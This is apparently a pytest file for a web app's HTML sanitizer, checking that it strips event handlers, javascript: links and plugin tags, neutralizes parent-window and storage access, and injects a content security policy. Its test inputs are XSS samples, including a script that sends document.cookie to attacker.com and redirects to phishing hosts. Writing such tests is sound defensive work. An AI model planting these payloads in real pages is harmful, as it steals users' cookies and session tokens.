import uuid
import pytest
from sqlalchemy.ext.asyncio import AsyncSession
from app.core.security import ArtifactSanitizer, sanitizer
from app.repositories.session_repository import SessionRepository
from app.schemas.artifact import ArtifactCreate
from app.services.artifact_service import ArtifactService


def test_sanitize_strips_inline_event_handlers():
    malicious_html = """
    <div onmouseover="alert('hover')">
        <img src="x" onerror="alert(document.cookie)">
        <button onclick="stealTokens()">Click Me</button>
    </div>
    """
    sanitized = sanitizer.sanitize_html(malicious_html)

    assert "onerror" not in sanitized.lower()
    assert "onclick" not in sanitized.lower()
    assert "onmouseover" not in sanitized.lower()
    assert "document.cookie" not in sanitized


def test_sanitize_neutralizes_cookie_exfiltration():
    malicious_script = """
    <script>
        const cookie = document.cookie;
        fetch('https://attacker.com/steal?c=' + cookie);
    </script>
    """
    sanitized = sanitizer.sanitize_html(malicious_script)

    assert "document.cookie" not in sanitized
    assert "neutralized_forbidden_access" in sanitized


def test_sanitize_neutralizes_parent_window_breakout():
    malicious_html = """
    <script>
        window.parent.location = 'https://phishing.com';
        window.top.document.body.innerHTML = 'HACKED';
        parent.location.href = 'https://evil.com';
    </script>
    """
    sanitized = sanitizer.sanitize_html(malicious_html)

    assert "window.parent" not in sanitized
    assert "window.top" not in sanitized
    assert "parent.location" not in sanitized
    assert "neutralized_forbidden_access" in sanitized


def test_sanitize_neutralizes_localstorage_access():
    malicious_html = """
    <script>
        const token = localStorage.getItem('session_token');
        const session = sessionStorage.getItem('user_id');
    </script>
    """
    sanitized = sanitizer.sanitize_html(malicious_html)

    assert "localStorage" not in sanitized
    assert "sessionStorage" not in sanitized


def test_sanitize_neutralizes_dangerous_javascript_protocols():
    malicious_html = """
    <a href="javascript:alert('XSS')">Click here for prize</a>
    <iframe src="javascript:alert(1)"></iframe>
    """
    sanitized = sanitizer.sanitize_html(malicious_html)

    assert "javascript:alert" not in sanitized
    assert "#neutralized-unsafe-link" in sanitized


def test_sanitize_strips_dangerous_plugin_tags():
    malicious_html = """
    <applet code="Malicious.class"></applet>
    <embed src="malicious.swf">
    <object data="malicious.jar"></object>
    <frame src="evil.html"></frame>
    """
    sanitized = sanitizer.sanitize_html(malicious_html)

    assert "<applet" not in sanitized
    assert "<embed" not in sanitized
    assert "<object" not in sanitized
    assert "<frame" not in sanitized


def test_sanitize_injects_content_security_policy():
    html_doc = "<html><head><title>Growth Widget</title></head><body><h1>Calculator</h1></body></html>"
    sanitized = sanitizer.sanitize_html(html_doc)

    assert "Content-Security-Policy" in sanitized
    assert "default-src 'none'" in sanitized
    assert "style-src 'unsafe-inline'" in sanitized


def test_sanitize_enforces_secure_links():
    html_doc = '<a href="https://lenny.substack.com">Lenny Newsletter</a>'
    sanitized = sanitizer.sanitize_html(html_doc)

    assert 'target="_blank"' in sanitized
    assert 'rel="noopener noreferrer"' in sanitized


@pytest.mark.asyncio
async def test_artifact_service_persists_sanitized_html(db_session: AsyncSession):
    session = await SessionRepository.create(db=db_session, title="Security Session")

    malicious_payload = ArtifactCreate(
        session_id=session.id,
        title="Malicious Widget",
        artifact_type="html",
        content='<div onmouseover="alert(1)"><script>var c = document.cookie;</script><h1>PMF Calc</h1></div>',
    )

    persisted = await ArtifactService.create_artifact(db=db_session, payload=malicious_payload)

    assert "onmouseover" not in persisted.content
    assert "document.cookie" not in persisted.content
    assert "Content-Security-Policy" in persisted.content
    assert "PMF Calc" in persisted.content

